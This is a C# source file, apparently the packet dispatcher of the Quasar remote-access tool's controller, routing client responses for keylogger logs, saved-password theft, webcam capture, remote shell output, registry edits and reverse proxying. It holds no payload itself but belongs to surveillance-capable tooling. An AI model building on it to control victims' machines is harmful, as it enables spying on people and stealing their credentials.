﻿using Quasar.Common.Messages;
using xServer.Core.Commands;
using xServer.Core.ReverseProxy;

namespace xServer.Core.Networking
{
    public static class PacketHandler
    {
        public static void HandlePacket(Client client, IMessage packet)
        {
            if (client == null || client.Value == null)
                return;

            var type = packet.GetType();

            if (type == typeof(SetStatus))
            {
                CommandHandler.HandleSetStatus(client, (SetStatus)packet);
            }
            else if (type == typeof(SetUserStatus))
            {
                CommandHandler.HandleSetUserStatus(client, (SetUserStatus)packet);
            }
            else if (type == typeof(GetProcessesResponse))
            {
                CommandHandler.HandleGetProcessesResponse(client,
                    (GetProcessesResponse)packet);
            }
            else if (type == typeof(GetSystemInfoResponse))
            {
                CommandHandler.HandleGetSystemInfoResponse(client,
                    (GetSystemInfoResponse)packet);
            }
            else if (type == typeof(GetWebcamsResponse))
            {
                CommandHandler.HandleGetWebcamsResponse(client, (GetWebcamsResponse)packet);
            }
            else if (type == typeof(GetWebcamResponse))
            {
                CommandHandler.HandleGetWebcamResponse(client, (GetWebcamResponse)packet);
            }
            else if (type == typeof(DoShellExecuteResponse))
            {
                CommandHandler.HandleDoShellExecuteResponse(client,
                    (DoShellExecuteResponse)packet);
            }
            else if (type == typeof(GetStartupItemsResponse))
            {
                CommandHandler.HandleGetStartupItemsResponse(client,
                    (GetStartupItemsResponse)packet);
            }
            else if (type == typeof(GetKeyloggerLogsResponse))
            {
                CommandHandler.HandleGetKeyloggerLogsResponse(client, (GetKeyloggerLogsResponse)packet);
            }
            else if (type == typeof(GetRegistryKeysResponse))
            {
                CommandHandler.HandleLoadRegistryKey((GetRegistryKeysResponse)packet, client);
            }
            else if (type == typeof(GetCreateRegistryKeyResponse))
            {
                CommandHandler.HandleCreateRegistryKey((GetCreateRegistryKeyResponse)packet, client);
            }
            else if (type == typeof(GetDeleteRegistryKeyResponse))
            {
                CommandHandler.HandleDeleteRegistryKey((GetDeleteRegistryKeyResponse)packet, client);
            }
            else if (type == typeof(GetRenameRegistryKeyResponse))
            {
                CommandHandler.HandleRenameRegistryKey((GetRenameRegistryKeyResponse)packet, client);
            }
            else if (type == typeof(GetCreateRegistryValueResponse))
            {
                CommandHandler.HandleCreateRegistryValue((GetCreateRegistryValueResponse)packet, client);
            }
            else if (type == typeof(GetDeleteRegistryValueResponse))
            {
                CommandHandler.HandleDeleteRegistryValue((GetDeleteRegistryValueResponse)packet, client);
            }
            else if (type == typeof(GetRenameRegistryValueResponse))
            {
                CommandHandler.HandleRenameRegistryValue((GetRenameRegistryValueResponse)packet, client);
            }
            else if (type == typeof(GetChangeRegistryValueResponse))
            {
                CommandHandler.HandleChangeRegistryValue((GetChangeRegistryValueResponse)packet, client);
            }
            else if (type == typeof(GetPasswordsResponse))
            {
                CommandHandler.HandleGetPasswordsResponse(client, (GetPasswordsResponse)packet);
            }
            else if (type == typeof(ReverseProxyConnectResponse) ||
                    type == typeof(ReverseProxyData) ||
                    type == typeof(ReverseProxyDisconnect))
            {
                ReverseProxyCommandHandler.HandleCommand(client, packet);
            }
            else if (type == typeof(GetConnectionsResponse))
            {
                CommandHandler.HandleGetConnectionsResponse(client, (GetConnectionsResponse)packet);
            }
        }
    }
}
